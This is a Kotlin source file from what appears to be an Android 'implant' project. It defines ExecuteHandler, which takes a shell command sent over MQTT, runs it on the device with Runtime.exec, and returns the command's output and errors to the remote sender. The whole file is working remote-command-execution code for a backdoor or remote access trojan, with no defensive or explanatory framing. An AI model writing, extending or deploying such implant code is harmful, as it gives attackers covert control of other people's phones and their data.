package com.cooperthecoder.implant.command.handlers

import android.content.Context
import android.util.Log
import com.cooperthecoder.implant.command.Command
import org.eclipse.paho.android.service.MqttAndroidClient
import java.io.BufferedReader
import java.io.InputStreamReader

class ExecuteHandler(context: Context, client: MqttAndroidClient, command: Command) : CommandHandler(context, client, command) {
    companion object {
        val TAG = ExecuteHandler::class.java.name
    }

    override fun action() {
        val shellCommand = command.arguments["shell_command"]
        if (shellCommand == null) {
            reply("", "Required argument: shell_command")
            return
        }

        Log.d(TAG, "Executing: $shellCommand")
        val process = try {
            Runtime.getRuntime().exec(shellCommand)
        } catch (e: Exception) {
            Log.e(TAG, "Error running command", e)
            e.message?.let { reply("", it) }
            return
        }
        process.waitFor()

        val outputReader = BufferedReader(InputStreamReader(process.inputStream))
        val errorReader = BufferedReader(InputStreamReader(process.errorStream))
        val outputBuilder = StringBuilder()
        val errorBuilder = StringBuilder()
        outputReader.forEachLine {
            outputBuilder.append(it)
        }
        errorReader.forEachLine {
            errorBuilder.append(it)
        }

        val output = outputBuilder.toString()
        val error = errorBuilder.toString()
        reply(output, error)
    }
}